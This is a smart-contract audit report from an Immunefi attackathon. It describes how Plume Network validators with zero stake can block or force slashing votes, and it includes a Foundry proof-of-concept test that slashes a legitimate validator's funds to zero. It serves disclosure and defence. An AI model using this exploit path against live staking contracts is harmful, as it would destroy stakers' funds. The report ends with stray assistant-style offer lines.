# 50212 sc insight validators without staked funds can control slashing decisions leading to protocol insolvency

**Submitted on Jul 22nd 2025 at 16:02:46 UTC by @holydevoti0n for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #50212
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/ValidatorFacet.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Protocol insolvency

## Description

## Brief/Intro

The protocol lets validators with zero funds staked join governance (slashing), leading to two critical vulnerabilities: (1) unfunded validators can shield malicious ones from slashing by skipping votes, and (2) with only two validators, one can unilaterally slash the other, causing permanent fund loss.

## Vulnerability Details

When adding a new validator, their status is immediately set to active. As soon as this validator is added through `ValidatorFacet.addValidator`, their status is set to active:

```solidity
 function addValidator(
        uint16 validatorId,
        uint256 commission,
        address l2AdminAddress,
        address l2WithdrawAddress,
        string calldata l1ValidatorAddress,
        string calldata l1AccountAddress,
        address l1AccountEvmAddress,
        uint256 maxCapacity
    ) external onlyRole(PlumeRoles.VALIDATOR_ROLE) {
      ...
        PlumeStakingStorage.ValidatorInfo storage validator = $.validators[validatorId];
        validator.validatorId = validatorId;
        validator.commission = commission;
        validator.delegatedAmount = 0;
        validator.l2AdminAddress = l2AdminAddress;
        validator.l2WithdrawAddress = l2WithdrawAddress;
        validator.l1ValidatorAddress = l1ValidatorAddress;
        validator.l1AccountAddress = l1AccountAddress;
        validator.l1AccountEvmAddress = l1AccountEvmAddress;
@>        validator.active = true;
        validator.slashed = false;
        validator.maxCapacity = maxCapacity;

        ...
    }
```

When voting to slash a validator, the only requirement to allow a validator to vote is to be active and not slashed:

```solidity
    function voteToSlashValidator(uint16 maliciousValidatorId, uint256 voteExpiration) external nonReentrant {
        ...
        // Check 2: Target validator exists, not slashed, and is active
        PlumeStakingStorage.ValidatorInfo storage targetValidator = $.validators[maliciousValidatorId];
        if (!$.validatorExists[maliciousValidatorId]) {
            revert ValidatorDoesNotExist(maliciousValidatorId);
        }
@>        if (targetValidator.slashed) {
            revert ValidatorAlreadySlashed(maliciousValidatorId);
        }
@>        if (!targetValidator.active) {
            revert ValidatorInactive(maliciousValidatorId);
```

After talking to sponsor (@alp) about how they will guarantee that the validator has any funds deposited, as the contract does not enforce it when the validator is added, sponsor (@alp) said:

> "currently validators are approved by a committee, and after being added they require some amount to stake. so that part is a manual process currently."

Problem is: this makes the protocol vulnerable to two attack vectors.

1st. The recently added validator is accounted as an eligible voter in the slashing process. Meaning if this validator decides to skip a vote, the unanimous vote requirement fails, preventing slashing of the malicious validator.

Snippet showing vote counting and eligible validators:

```solidity
    function voteToSlashValidator(uint16 maliciousValidatorId, uint256 voteExpiration) external nonReentrant {
        ...

        // --- AUTO-SLASH TRIGGER ---
        // After casting the vote, check if the unanimity threshold has been met.
        uint256 activeVoteCount = $.slashVoteCounts[maliciousValidatorId];
@>        uint256 totalEligibleValidators = _countEligibleValidators(maliciousValidatorId);


        if (activeVoteCount >= totalEligibleValidators && totalEligibleValidators > 0) {
@>            _performSlash(maliciousValidatorId, msg.sender);
        }
    }

    function _countEligibleValidators(
        uint16 validatorToExclude
    ) internal view returns (uint256) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256 totalActive = _countActiveValidators();
        PlumeStakingStorage.ValidatorInfo storage excludedInfo = $.validators[validatorToExclude];
        if (excludedInfo.active && !excludedInfo.slashed) {
            if (totalActive > 0) {
                // @audit return all active validators - 1
@>                return totalActive - 1;
            }
        }
        return totalActive;
    }
```

Example scenario illustrating this vector:

{% stepper %}
{% step %}

### Example — New active but unfunded validator blocks slashing

1. Network has 10 active validators with staked funds.
2. A new validator is added; their status is immediately set to active.
3. One of the previous validators is acting maliciously.
4. Validators start voting to slash the malicious validator.
5. The new validator decides to skip the vote to avoid the malicious validator being slashed.
6. Unanimity is not reached.
7. The admin sets the validator to inactive, but since they have no funds at risk, they blocked the slashing of a malicious validator "for free."
   {% endstep %}
   {% endstepper %}

2nd. A malicious validator with zero funds (or even with funds) and active can vote to slash a legitimate validator, causing a permanent loss of funds for the validator and its stakers.

The same code fragment demonstrates the condition that triggers the slash. `_countEligibleValidators` returns all active validators minus one (the target), which in small validator sets (e.g., 2 active validators) makes a single vote sufficient to trigger a slash:

```solidity
   if (activeVoteCount >= totalEligibleValidators && totalEligibleValidators > 0) {
        _performSlash(maliciousValidatorId, msg.sender);
   }

    function _countEligibleValidators(
        uint16 validatorToExclude
    ) internal view returns (uint256) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256 totalActive = _countActiveValidators();
        PlumeStakingStorage.ValidatorInfo storage excludedInfo = $.validators[validatorToExclude];
        if (excludedInfo.active && !excludedInfo.slashed) {
            if (totalActive > 0) {
                // @audit return all active validators - 1
@>                return totalActive - 1;
            }
        }
        return totalActive;
    }
```

Example scenario illustrating this vector:

{% stepper %}
{% step %}

### Example — Two active validators: single malicious vote can slash the other

1. Two active validators exist.
2. One decides to act maliciously and calls `voteToSlashValidator` on the other (legit) validator.
3. `_countEligibleValidators` returns 1 (total active - 1), so only one vote is necessary to slash the other validator.
4. A malicious validator without funds (or with funds) can thus vote to slash a legit validator, burning that validator's funds and its stakers' funds.
   {% endstep %}
   {% endstepper %}

## Impact

* Validators with zero funds are accounted as eligible for voting. Those validators can prevent the slashing of malicious validators by skipping the vote. This is likely as "zero funds" means validators who skip voting have nothing to lose.
* A malicious validator with zero funds could vote to slash a legit validator and cause permanent loss of funds for the validator (and their stakers) when the number of active validators is 2.

## Recommendation

{% stepper %}
{% step %}

### When adding a validator, set status to inactive by default

When adding a validator, set their status to inactive. Only when the validator deposits the required funds to participate should their status be set to active.
{% endstep %}

{% step %}

### Only count votes from validators with "skin in the game"

`voteToSlashValidator` should only consider votes of validators that meet the minimum stake required to participate in governance/voting.
{% endstep %}

{% step %}

### Reconsider slashing logic for small validator sets

Reconsider the logic for slashing when there are only two active validators in the network (or other small sizes) to avoid single-vote unilateral slashes.
{% endstep %}
{% endstepper %}

## Proof of Concept

The test below shows that a validator with zero funds can vote to slash a legit validator and cause permanent loss of funds for that validator.

Add the following test to `PlumeStakingDiamond.t.sol`:

```solidity
function testMaliciousValidator_withZeroFunds_canSlashLegitValidator() public {
        // Setup validator
        vm.startPrank(admin);
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.validators[DEFAULT_VALIDATOR_ID].active = true;
        $.validators[1].active = true;
        vm.stopPrank();

        // Set max slash vote duration
        vm.startPrank(admin);
        ManagementFacet(address(diamondProxy)).setMaxSlashVoteDuration(1 days);
        vm.stopPrank();

        // print validator count - 2 active validators
        console2.log("Active validators count: %d", ValidatorFacet(address(diamondProxy)).getActiveValidatorCount());

        // Create users and only stake funds with validator 0
        address user1_slash = makeAddr("user1_slash");
        vm.deal(user1_slash, 100 ether);

        // user1 stakes with validator 0
        vm.startPrank(user1_slash);
        StakingFacet(address(diamondProxy)).stake{value: 10 ether}(
            DEFAULT_VALIDATOR_ID
        );
        vm.stopPrank();

        // validator 0 has 10eth staked
        (, uint256 validatorStakedAmount2, ) = ValidatorFacet(address(diamondProxy)).getValidatorInfo(0);
        console2.log("validator 0 stake amount: %e", validatorStakedAmount2);

        // validator 1 is active and have no funds
        (, uint256 validatorStakedAmount, ) = ValidatorFacet(address(diamondProxy)).getValidatorInfo(1);
        console2.log("validator 1 stake amount: %e", validatorStakedAmount);

        // Target validator to slash
        address voter1Admin = user2; // user2 is admin for validator1
        uint16 voter0ValidatorId = 0;
        address voter0Admin = validatorAdmin; // validatorAdmin is admin for validator0

        // Malicious validator slash a legit validator - notice malicious validator has no funds.
        console2.log("Malicious validator 1 with zero funds will vote to slash a legit validator and burn all his staked funds");
        vm.startPrank(voter1Admin);
        uint256 voteExpiration = block.timestamp + 1 hours; // Set vote expiration 1 hour from now
        ValidatorFacet(address(diamondProxy)).voteToSlashValidator(
            voter0ValidatorId,
            voteExpiration
        );
        vm.stopPrank();

        // Verify slashing succeeded by checking if validator is still active
        (bool isActive, , uint256 totalStaked, ) = ValidatorFacet(address(diamondProxy))
            .getValidatorStats(0);
        console2.log("Is legit validator 0 active? %s", isActive == true ? "true" : "false");
        console2.log("Total staked funds after slash: %d", totalStaked);
    }
```

Run:

```
forge test --mt testMaliciousValidator_withZeroFunds_canSlashLegitValidator --via-ir -vv
```

Example output:

```
Ran 1 test for test/PlumeStakingDiamond.t.sol:PlumeStakingDiamondTest
[PASS] testMaliciousValidator_canSlashLegitValidator() (gas: 499119)
Logs:
  Active validators count: 2
  validator 0 stake amount: 1e19
  validator 1 stake amount: 0e0
  Malicious validator 1 with zero funds will vote to slash a legit validator and burn all his staked funds
  Is legit validator 0 active? false
  Total staked funds after slash: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.72ms (1.30ms CPU time)

Ran 1 test suite in 173.35ms (37.72ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

***

If you want, I can:

* Suggest concrete code patches to enforce minimum stake before setting `active = true`.
* Draft a minimal change to `_countEligibleValidators` and `voteToSlashValidator` to only count eligible (staked) validators.
